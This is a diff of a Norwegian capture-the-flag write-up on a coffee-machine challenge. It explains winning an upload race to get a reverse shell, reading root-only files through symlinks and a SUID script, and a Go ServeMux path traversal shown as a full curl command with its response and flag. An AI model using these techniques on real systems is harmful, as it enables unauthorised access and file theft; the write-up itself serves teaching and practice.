@@ -363,7 +363,8 @@ Koden inneholder et forsøk på å hindre brukere å laste opp andre filer enn P
 25		    return fmt.Errorf("create %q: %w", absPath, err)
 26	    }
 ```
-For at jeg lettere skal kunne vinne kappløpet mot serveren, lager jeg et shell-script (`adhoc_service.sh`) som er tett opp mot 2MB (det meste er bare kommentarer). På corax kjører jeg et bash-script som ser slik ut:
+For at jeg lettere skal kunne vinne kappløpet mot serveren, lager jeg et shell-script (`adhoc_service.sh`) som er tett opp mot 2MB (det meste er bare kommentarer). 
+På corax kjører jeg et bash-script som ser slik ut:
 ```sh
 #!/bin/bash
 
@@ -392,7 +393,57 @@ echo "Done."
 ```
 rc.py er et Python-script som prøver kontinuerlig å laste ned `background_tmp.png`. Når den klarer å laste det ned, noterer den verdien til `X_SIGNATURE` og sender den inn til server.py. server.py er et Python-script som legger på riktig signatur i headeren når `adhoc_service.sh` hentes. Dette scriptet inneholder kommandoer som starter et reverse shell tilbake til corax.
 
-Scriptet ovenfor kjøres altså i en uendelig loop til vi har fått riktig signatur:
-1. Starter script som kontinuerlig prøver å laste ned `background_tmp.png` (i realiteten `adhoc_service.sh`) med tilhørende 
+Scriptet ovenfor gjør altså flere steg i en uendelig loop frem til vi har fått riktig signatur (vunnet kappløpet mot serveren):
+1. Starter rc.py som kontinuerlig prøver å laste ned `background_tmp.png` (i realiteten `adhoc_service.sh`) med tilhørende signatur som server har produsert for oss
+2. Laster opp `adhoc_service.sh` som bakgrunnsbilde kontinuerlig i håp om at rc.py i punkt nr.1 klarer å laste ned `background_tmp.png` før den slettes fra server.
+3. Når md5summen til server.py er endret, vet vi at rc.py har fått signaturen og oppdatert server.py, og vi har vunnet kappløpet.
 
+Dette går relativt kjapt, og vi kan starte server.py for å serve `adhoc_service.sh`. Deretter trykker vi på "Run service script now", og vi har fått reverse shell.
 
+<br>
+
+### 2.19.2 Kaffemaskin ROOT
+
+Her utnytter jeg den spesiallagde SUID-filen `/usr/local/bin/sync-etc.sh` til å lese filer jeg egentlig ikke har lov til. Filen ser slik ut:
+```sh
+#!/bin/sh
+
+SRC="$PERSISTENCE_ROOT/data/admin"
+
+cat "$SRC/hosts" > /etc/hosts
+cat "$SRC/issue" > /etc/issue
+cat "$SRC/motd" > /etc/motd
+cat "$SRC/hostname" > /etc/hostname
+cat "$SRC/os-release" > /etc/os-release
+```
+Den er ikke leselig for andre enn root, men det er ganske tydelig hva den gjør basert på hvilke filer man kan endre på i brukergrensesnittet til netttsiden og navnet på filen.
+
+Jeg løste denne deloppgaven ved å bruke symlinks. Ved å lage en symlink fra f.eks. motd som pekte mot /entrypoint.sh, og deretter kjøre `/usr/local/bin/sync-etc.sh` kunne jeg lese fra /etc/motd innholdet i /entrypoint.sh og dermed hvordan flagget til root var formatert. Deretter gjorde jeg det samme for å lese root-flagget.
+
+<br>
+
+### 2.19.3 Kaffemaskin SERVER
+https://ilya.app/blog/servemux-and-path-traversal/ 
+Bruken av mux i golang er ikke alltid trygt for å hindre path traversal:
+```sh
+$ curl -v -X CONNECT --path-as-is http://10.244.10.116:9000/service/../../../../../../../../server_flag.txt
+*   Trying 10.244.10.116:9000...
+* Established connection to 10.244.10.116 (10.244.10.116 port 9000) from 192.168.29.143 port 41156 
+* using HTTP/1.x
+> CONNECT /service/../../../../../../../../server_flag.txt HTTP/1.1
+> Host: 10.244.10.116:9000
+> User-Agent: curl/8.17.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Content-Disposition: attachment; filename=../../../../../../../../server_flag.txt
+< Content-Type: application/octet-stream
+< X-Content-Type-Options: nosniff
+< X-Signature: wInLrDjv5qOd5c9Z3TRuIu8qWw+rpHl3e/MxD57lMQR7CBtoCiVWijcAqDHED0cjfEW4WuHVhaafKHS4NThBRYpOT/p+ITJ/+UL4iJBXphJWpccLZmnDs4cfYBNpC5lq6JVe0Oe5WX0tGlyBAFYEQDuC0a6ZtdPDhNdZUVVJ8kI=
+< X-Signature-Alg: rsa-sha256
+< Date: Tue, 30 Dec 2025 02:17:26 GMT
+< Content-Length: 33
+< 
+719bd1bc27755dd0b485d7f3a09ad836
+```
